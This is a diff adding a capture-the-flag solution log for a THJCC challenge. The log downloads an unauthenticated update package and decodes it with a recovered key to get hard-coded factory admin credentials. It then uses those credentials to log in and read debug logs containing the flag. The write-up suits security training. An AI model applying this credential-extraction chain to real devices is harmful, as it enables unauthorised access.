@@ -1,0 +1,52 @@
+Target: http://chal.thjcc.org:7356/
+
+1. Public update metadata
+
+GET /api/update/check
+
+HTTP/1.0 200 OK
+{"current_version":"TG666-1.4.2","latest_version":"TG666-1.4.2","update_available":false,"package_url":"/api/update/package?channel=stable"}
+
+2. Public package download
+
+GET /api/update/package?channel=stable
+
+HTTP/1.0 200 OK
+Content-Type: application/octet-stream
+Content-Disposition: attachment; filename=teagod666-update.bin
+Content-Length: 237
+
+SHA-256:
+edc578e1dfc77ee8b3861dce01a4076427922eea3bbde7acc2b9167a93029f6a
+
+3. Decoded package data
+
+Key:
+teashop-666
+
+Plaintext configuration:
+{"model":"TeaGod666","username":"admin","password":"oolong_tea_666","note":"Factory service account. Rotate after first boot."}
+
+4. Factory login
+
+POST /api/login
+Content-Type: application/json
+
+{"username":"admin","password":"oolong_tea_666"}
+
+HTTP/1.0 200 OK
+Set-Cookie: session=[REDACTED]; HttpOnly; SameSite=Lax; Path=/
+
+{"ok":true}
+
+5. Debug logs
+
+GET /api/system/logs?level=debug
+Cookie: session=[REDACTED]
+
+HTTP/1.0 200 OK
+
+factory_validation:
+THJCC{t3ag0d666_h77p5://y0u7u.b3/Dji_wUhFPvo?si=z1B9a-4nShzop-du&t=1577}
+
+No CTFd API token or live session cookie is stored in this transcript.
